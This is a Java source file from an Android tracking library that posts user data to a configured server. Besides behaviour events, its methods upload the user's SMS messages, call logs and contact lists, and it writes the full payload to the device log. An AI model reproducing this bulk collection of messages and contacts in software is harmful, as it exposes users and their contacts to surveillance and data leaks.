package com.xwjr.track;

import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class TrackOperate {

    //上传用户行为数据，data为List<Map<String,String>>的json字符串

    public static void upload(Map<String, String> data) {
        //开启线程来发起网络请求
        List<Map<String, String>> mapList = new ArrayList<>();
        mapList.add(data);
        upload(TrackData.mapList2String(mapList));
    }

    public static void upload(List<Map<String, String>> data) {
        //开启线程来发起网络请求
        upload(TrackData.mapList2String(data));
    }

    public static void upload(final String data) {
        //开启线程来发起网络请求
        Log.i(TrackConfig.logTag, "上传的URL " + TrackConfig.trackUrl + TrackConfig.trackApphubkey);
        Log.i(TrackConfig.logTag, "上传的json数据 " + data);
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection connection = null;
                BufferedReader reader = null;
                try {
                    URL url = new URL(TrackConfig.trackUrl + TrackConfig.trackApphubkey);
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setConnectTimeout(10000);
                    connection.setReadTimeout(10000);
                    connection.setRequestMethod("POST");
//                    connection.setRequestProperty("Content-type", "application/json;charset=UTF-8");
                    DataOutputStream out = new DataOutputStream(connection.getOutputStream());
                    out.write(("data=" + data).getBytes());
//                    out.writeBytes("data=" + data);
                    InputStream in = connection.getInputStream();
                    //下面对获取到的输入流进行读取
                    reader = new BufferedReader(new InputStreamReader(in));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    Log.i(TrackConfig.logTag, "上传返回数据 " + response.toString());

                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (reader != null) {
                        try {
                            reader.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }

    //上传用户短信信息，mobile为当前登录用户的手机号
    public static void upLoadSMS(String mobile) {
        try {
            upload(TrackData.mapList2String(TrackData.getSMSData(mobile)));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传用户通话记录信息，mobile为当前登录用户的手机号
    public static void upLoadCall(String mobile) {
        try {
            upload(TrackData.mapList2String(TrackData.getCallData(mobile)));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传用户通话记录信息，mobile为当前登录用户的手机号
    public static void upLoadContract(String mobile) {
        try {
            upload(TrackData.mapList2String(TrackData.getContactData(mobile)));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传本地存储的数据
    public static void upLoadLocalData(boolean clearData) {
        try {
            upload(TrackLocalData.getTrackData());
            if (clearData) {
                TrackLocalData.clearTrackData();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void upLoadLocalData() {
        try {
            upload(TrackLocalData.getTrackData());
            TrackLocalData.clearTrackData();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
